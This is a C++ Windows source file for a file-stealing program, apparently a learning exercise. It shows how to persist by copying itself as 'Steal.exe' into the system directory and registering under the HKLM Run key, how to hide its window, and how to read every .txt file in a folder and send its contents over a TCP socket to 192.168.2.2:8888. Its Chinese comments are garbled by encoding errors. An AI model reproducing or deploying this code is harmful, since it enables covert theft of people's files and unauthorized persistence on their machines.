#include<iostream>
#include<windows.h>
#include<cstdio>
#include<cstring>
#include<string>

#include<corecrt_io.h>

//#include<WinSock2.h>

#pragma comment(lib,"ws2_32.lib")
// typedef struct _WIN32_FIND_DATAW {              //�ļ��ṹ��
// 	DWORD dwFileAttributes;                       ����
// 	FILETIME ftCreationTime;                      ����ʱ��
// 	FILETIME ftLastAccessTime;                    ���һ�ν���ʱ��
// 	FILETIME ftLastWriteTime;                     ���һ��д��ʱ��
// 	DWORD nFileSizeHigh;                          �ļ���С�ĸ�λ
// 	DWORD nFileSizeLow;                           �ļ���С�ĵ�λ
// 	DWORD dwReserved0;                            �����ֶ�
// 	DWORD dwReserved1;                            �����ֶ�
// 	_Field_z_ WCHAR  cFileName[MAX_PATH];         �ļ���
// 	_Field_z_ WCHAR  cAlternateFileName[14];      �ı�֮����ļ���
// #ifdef _MAC
// 	DWORD dwFileType;
// 	DWORD dwCreatorType;
// 	WORD  wFinderFlags;
// #endif
// } WIN32_FIND_DATAW, * PWIN32_FIND_DATAW, * LPWIN32_FIND_DATAW;

void AddToSystem()    //���뵽ϵͳע���
{
	HKEY  hKEY;
	char  CurrentPath[MAX_PATH];
	char  SysPath[MAX_PATH];
	long  ret = 0;
	LPSTR FileNewName;
	LPSTR FileCurrentName;
	DWORD type = REG_SZ;
	DWORD size = MAX_PATH;
	LPCTSTR Rgspath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";  //regedit  win + R

	GetSystemDirectory(SysPath, size);
	GetModuleFileName(NULL, CurrentPath, size);
	//Copy File
	FileCurrentName = CurrentPath;
	FileNewName = lstrcat(SysPath, "\\Steal.exe");
	struct _finddata_t Steal;
	printf("ret1 = %d,FileNewName = %s\n", ret, FileNewName);
	if (_findfirst(FileNewName, &Steal) != -1)
		return;//�Ѿ���װ��
	printf("ret2 = %d\n", ret);

	int ihow = MessageBox(0, "�ó���ֻ�������ںϷ�����;��\n�������иó���ʹ��̨�������ڱ���ص�״̬��\n����������������밴��ȡ������ť�˳���\n���¡��ǡ���ť�ó��򽫱����Ƶ����Ļ����ϣ�����ϵͳ�����Զ����С�\n���¡��񡱰�ť������ֻ����һ�Σ�����������ϵͳ�������κζ�����", "����", MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ihow == IDCANCEL)
		exit(0);

	if (ihow == IDNO)
		return;//ֻ����һ��
	//�����ļ�
	ret = CopyFile(FileCurrentName, FileNewName, TRUE);
	if (!ret)
	{
		return;
	}
	//����ע���
	printf("ret = %d\n", ret);
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &hKEY);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	//Set Key
	ret = RegSetValueEx(hKEY, "Steal", NULL, type, (const unsigned char*)FileNewName, size);
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKEY);
		return;
	}
	RegCloseKey(hKEY);

}
//Ӱ������
void HideMyself()
{
	// �õ���ǰ�Ĵ��ھ��
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int SendToServer(const char* myPath)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1, -1);
	//��ʼ���׽��ֿ�
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return err;
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	SOCKET sock = -1;
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		std::cout << "socket error!" << std::endl;
		return -2;
	}

	SOCKADDR_IN peer;
	peer.sin_family = AF_INET;
	std::string address("192.168.2.2");
	peer.sin_addr.S_un.S_addr = inet_addr(address.c_str());
	peer.sin_port = htons(8888);

	if (connect(sock, (SOCKADDR*)&peer, sizeof(peer)) < 0)
	{
		std::cout << "connect fail !" << std::endl;
		return -3;
	}
	std::string sendMsg;

	//��ȡ�ļ�����
	FILE* pf = fopen(myPath, "rb");
	if (pf == NULL)
	{
		std::cout << "fopen() fail!" << std::endl;
		return -1;
	}
	char ch = 0;
	while (TRUE)
	{
		size_t len = fread(&ch, sizeof(char), 1, pf);
		if (len > 0)
		{
			sendMsg += ch;
		}
		else
		{
			fclose(pf);
			break;
		}
	}

	if (send(sock, sendMsg.c_str(), sendMsg.size(), 0) < 0)
	{
		std::cerr << "send error!" << std::endl;
		return -4;
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}
int doSteelFile(const char* szPath)
{
	//1������·���µ������ļ�
	WIN32_FIND_DATA FindFileData;        //�øýṹ������ʾ�ļ�             ////windows�����ļ���
	FindFileData.cFileName[MAX_PATH] = { 0 };
	FindFileData.dwFileAttributes = NULL;
	FindFileData.ftCreationTime = {};
	//FindFileData.cAlternateFileName = {};
	FindFileData.ftLastWriteTime = {};
	FindFileData.nFileSizeHigh = 0;
	FindFileData.nFileSizeLow = 0;
	HANDLE hListFile;             //�ļ��þ������ʶ---���

	//2�������ҵ���һ���ļ�
	// 	WINBASEAPI
	// 		HANDLE                               //����ֵ��һ���ļ��������
	// 		WINAPI
	// 		FindFirstFileW(
	// 			_In_ LPCWSTR lpFileName,           //�ļ���  ---���
	// 			_Out_ LPWIN32_FIND_DATAW lpFindFileData    �ļ��ṹ��  ---����
	// 		);

	//windows���ļ�·������󳤶� MAX_PATH ==260
	char szFilePath[MAX_PATH] = { 0 };
	strcpy(szFilePath, szPath);
	//���һ��ͨ��� '\*'
	strcat(szFilePath, "\\*");
	hListFile=FindFirstFile(szFilePath, &FindFileData);     //�ú������ҵ���һ�ļ���ʼ��һֱ���ҵ���·���µ������ļ�
	                                          //ÿ���ҵ�һ���ļ����ͻὫ���ļ���������Ϣ���뵽FindFileData��

	std::string myFile;
	
	do
	{
		// 		WINBASEAPI
		// 			BOOL
		// 			WINAPI
		// 			FindNextFileW(             
		// 				_In_ HANDLE hFindFile,      
		// 				_Out_ LPWIN32_FIND_DATAW lpFindFileData  //����ҵ������о��
		// 			);

		//�����ҵ����ļ�
		myFile.clear();
		myFile += szPath;
		myFile += FindFileData.cFileName;
		std::cout << "myFile: " << myFile << std::endl;

		//�������е� ��.txt���ļ�
		if (strstr(myFile.c_str(), ".txt") == nullptr)
		{
			continue;
		}
		SendToServer(myFile.c_str());

	} while (FindNextFile(hListFile, &FindFileData));         //FindNextFile()������ҵ���һ���ļ��򷵻�TRUE,���򷵻�FALSE	

	return 0;
}


int main()
{
	std::cout << "Steel..." << std::endl;
	doSteelFile("F:\\TmpForSteelFile\\");

	system("pause");
	return 0;
}